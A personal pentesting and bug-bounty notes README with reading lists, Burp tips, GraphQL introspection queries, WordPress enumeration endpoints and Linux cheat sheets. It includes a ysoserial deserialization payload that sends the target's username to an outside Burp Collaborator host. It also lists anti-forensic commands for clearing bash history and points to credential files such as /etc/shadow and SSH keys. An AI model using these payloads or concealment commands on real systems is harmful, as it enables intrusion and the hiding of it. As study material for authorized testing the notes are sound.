# <img src="https://raw.githubusercontent.com/seeu-inspace/easyg/main/img/EasyG.png" alt="EasyG">
![last-commit](https://img.shields.io/github/last-commit/seeu-inspace/easyg) ![languages-count](https://img.shields.io/github/languages/count/seeu-inspace/easyg) ![languages](https://img.shields.io/github/languages/top/seeu-inspace/easyg)

EasyG started out as a script that I use to automate some information gathering tasks for PenTesting and Bug Hunting. Now it is more than that.

Here I gather all the resources about PenTesting and Bug Bounty Hunting that I find interesting: notes, payloads that I found useful and many links to blogs and articles that I want to read (because having a lot of bookmarks bothered me) and more.

**Index**
- [Blog / Writeups / News](#blog--writeups--news)
- [Burp suite](#burp-suite)
- [Ysoserial](#ysoserial)
- [GraphQL](#graphql)
- [WordPress](#wordpress)
- [SSRF](#ssrf)
- [Linux](#linux)

### To Read list
**GraphQL**
- https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application
- https://github.com/righettod/poc-graphql
- https://lab.wallarm.com/graphql-batching-attack/

**Miscellaneous**
- https://blog.yeswehack.com/yeswerhackers/abusing-s3-bucket-permissions/
- https://portswigger.net/web-security/ssrf
- https://portswigger.net/web-security/jwt
- https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters/blob/master/assets/blogposts.md
- https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters/blob/master/assets/media.md
- https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters/blob/master/assets/mobile.md
- https://www.bugcrowd.com/hackers/bugcrowd-university/
- https://www.microsoft.com/en-us/msrc/bounty-example-report-submission?rtc=1

### Blog / Writeups / News
- https://pentester.land/list-of-bug-bounty-writeups.html
- https://hackerone.com/hacktivity
- https://portswigger.net/research
- https://www.skeletonscribe.net
- https://cvetrends.com/

### Burp suite

To add a domain + subdomains in advanced scopes: `.*\.test\.com$`

**Cool extensions**
- [Autorize](https://github.com/PortSwigger/autorize)
- [InQL](https://github.com/doyensec/inql)
- [Turbo Intruder](https://github.com/PortSwigger/turbo-intruder)
- [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler)

### Ysoserial

Because of `Runtime.exec()`, ysoserial doesn't work well with multiple commands. After some research, I found a way to run multiple sys commands anyway, by using `sh -c $@|sh . echo ` before the multiple commands that we need to run. Here I needed to run the command `host` and `whoami`:

```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 'sh -c $@|sh . echo host $(whoami).<MY-'RATOR-ID>.burpcollaborator.net' | gzip | base64
```

### GraphQL

To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangoncharov.github.io/graphql-voyager/) or [InQL](https://github.com/doyensec/inql) for Burp Suite.

**GraphQL Introspection query**

```
{"query": "{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
```

```
{query: __schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}# Write your query or mutation here
```

```
{"operationName":"IntrospectionQuery","variables":{},"query":"query IntrospectionQuery {\n  __schema {\n    queryType {\n      name\n    }\n    mutationType {\n      name\n    }\n    subscriptionType {\n      name\n    }\n    types {\n      ...FullType\n    }\n    directives {\n      name\n      description\n      locations\n      args {\n        ...InputValue\n      }\n    }\n  }\n}\n\nfragment FullType on __Type {\n  kind\n  name\n  description\n  fields(includeDeprecated: true) {\n    name\n    description\n    args {\n      ...InputValue\n    }\n    type {\n      ...TypeRef\n    }\n    isDeprecated\n    deprecationReason\n  }\n  inputFields {\n    ...InputValue\n  }\n  interfaces {\n    ...TypeRef\n  }\n  enumValues(includeDeprecated: true) {\n    name\n    description\n    isDeprecated\n    deprecationReason\n  }\n  possibleTypes {\n    ...TypeRef\n  }\n}\n\nfragment InputValue on __InputValue {\n  name\n  description\n  type {\n    ...TypeRef\n  }\n  defaultValue\n}\n\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n              ofType {\n                kind\n                name\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n"}
```

### WordPress

- Data exposure:
  - `/wp-json/wp/v2/users/`
  - `/wp-json/th/v1/user_generation`
  - `/?rest_route=/wp/v2/users`
- xmlrpc.php enabled, [reference](https://hackerone.com/reports/138869). Send a post request to this endpoint with a body like this:
  ```xml
  <?xml version="1.0" encoding="utf-8"?>
  <methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
  </methodCall>
  ```
- Scan with WPScan [github.com/wpscanteam/wpscan](https://github.com/wpscanteam/wpscan)

### SSRF

For a temporary public server: [XAMPP](https://www.apachefriends.org/) + [ngrok](https://ngrok.com/)

### Linux


**Linux Commands**
```
netstat -tulpn                                        Show Linux network ports with process ID???s (PIDs)
watch ss -stplu                                       Watch TCP, UDP open ports in real time with socket summary.
lsof -i                                               Show established connections.
macchanger -m MACADDR INTR                            Change MAC address on KALI Linux.
ifconfig eth0 192.168.2.1/24                          Set IP address in Linux.
ifconfig eth0:1 192.168.2.3/24                        Add IP address to existing network interface in Linux.
ifconfig eth0 hw ether MACADDR                        Change MAC address in Linux using ifconfig.
ifconfig eth0 mtu 1500                                Change MTU size Linux using ifconfig, change 1500 to your desired MTU.
dig -x 192.168.1.1                                    Dig reverse lookup on an IP address.
host 192.168.1.1                                      Reverse lookup on an IP address, in case dig is not installed.
dig @192.168.2.2 domain.com -t AXFR                   Perform a DNS zone transfer using dig.
host -l domain.com nameserver                         Perform a DNS zone transfer using host.
nbtstat -A x.x.x.x                                    Get hostname for IP address.
ip addr add 192.168.2.22/24 dev eth0                  Adds a hidden IP address to Linux, does not show up when performing an ifconfig.
tcpkill -9 host google.com                            Blocks access to google.com from the host machine.
echo \"1\" > /proc/sys/net/ipv4/ip_forward              Enables IP forwarding, turns Linux box into a router ??? handy for routing traffic through a box.
echo \"8.8.8.8\" > /etc/resolv.conf                     Use Google DNS.  
```

**Linux User Management**
```
whoami                                                Shows currently logged in user on Linux.
id                                                    Shows currently logged in user and groups for the user.
last                                                  Shows last logged in users.
mount                                                 Show mounted drives.
df -h                                                 Shows disk usage in human readable output.
echo \"user:passwd\" | chpasswd                         Reset password in one line.
getent passwd                                         List users on Linux.
strings /usr/local/bin/blah                           Shows contents of none text files, e.g. whats in a binary.
uname -ar                                             Shows running kernel version.
PATH=$PATH:/my/new-path                               Add a new PATH, handy for local FS manipulation.
history                                               Show bash history, commands the user has entered previously.
```

**Linux File Commands**
```
df -h blah                                            Display size of file / dir Linux.
diff file1 file2                                      Compare / Show differences between two files on Linux.
md5sum file                                           Generate MD5SUM Linux.
md5sum -c blah.iso.md5                                Check file against MD5SUM on Linux, assuming both file and .md5 are in the same dir.
file blah                                             Find out the type of file on Linux, also displays if file is 32 or 64 bit.
dos2unix                                              Convert Windows line endings to Unix / Linux.
base64 < input-file > output-file                     Base64 encodes input file and outputs a Base64 encoded file called output-file.
base64 -d < input-file > output-file                  Base64 decodes input file and outputs a Base64 decoded file called output-file.
touch -r ref-file new-file                            Creates a new file using the timestamp data from the reference file, drop the -r to simply create a file.
rm -rf                                                Remove files and directories without prompting for confirmation.
```

**Misc Commands**
```
init 6                                                Reboot Linux from the command line.
gcc -o output.c input.c                               Compile C code.
gcc -m32 -o output.c input.c                          Cross compile C code, compile 32 bit binary on 64 bit Linux.
unset HISTORYFILE                                     Disable bash history logging.
rdesktop X.X.X.X                                      Connect to RDP server from Linux.
kill -9 $$                                            Kill current session.
chown user:group blah                                 Change owner of file or dir.
chown -R user:group blah                              Change owner of file or dir and all underlying files / dirs ??? recersive chown.
chmod 600 file                                        Change file / dir permissions, see [Linux File System Permissons](#linux-file-system-permissions) for details.
ssh user@X.X.X.X | cat /dev/null > ~/.bash_history    Clear bash history
```

**Linux File System Permissions**
```
777 rwxrwxrwx                                         No restriction, global WRX any user can do anything.
755 rwxr-xr-x                                         Owner has full access, others can read and execute the file.
700 rwx------                                         Owner has full access, no one else has access.
666 rw-rw-rw-                                         All users can read and write but not execute.
644 rw-r--r--                                         Owner can read and write, everyone else can read.
600 rw-------                                         Owner can read and write, everyone else has no access.
```

**Linux Directories**
```
/                                                     / also know as ???slash??? or the root.
/bin                                                  Common programs, shared by the system, the system administrator and the users.
/boot                                                 Boot files, boot loader (grub), kernels, vmlinuz
/dev                                                  Contains references to system devices, files with special properties.
/etc                                                  Important system config files.
/home                                                 Home directories for system users.
/lib                                                  Library files, includes files for all kinds of programs needed by the system and the users.
/lost+found                                           Files that were saved during failures are here.
/mnt                                                  Standard mount point for external file systems.
/media                                                Mount point for external file systems (on some distros).
/net                                                  Standard mount point for entire remote file systems ??? nfs.
/opt                                                  Typically contains extra and third party software.
/proc                                                 A virtual file system containing information about system resources.
/root                                                 root users home dir.
/sbin                                                 Programs for use by the system and the system administrator.
/tmp                                                  Temporary space for use by the system, cleaned upon reboot.
/usr                                                  Programs, libraries, documentation etc. for all user-related programs.
/var                                                  Storage for all variable files and temporary files created by users, such as log files, mail queue,
                                                      print spooler. Web servers, Databases etc.
```

**Linux Interesting Files / Directories**
```
/etc/passwd                                           Contains local Linux users.
/etc/shadow                                           Contains local account password hashes.
/etc/group                                            Contains local account groups.
/etc/init.d/                                          Contains service init script ??? worth a look to see whats installed.
/etc/hostname                                         System hostname.
/etc/network/interfaces                               Network interfaces.
/etc/resolv.conf                                      System DNS servers.
/etc/profile                                          System environment variables.
~/.ssh/                                               SSH keys.
~/.bash_history                                       Users bash history log.
/var/log/                                             Linux system log files are typically stored here.
/var/adm/                                             UNIX system log files are typically stored here.
/var/log/apache2/access.log                           Apache access log file typical path.
/var/log/httpd/access.log                             Apache access log file typical path.
/etc/fstab                                            File system mounts.
```
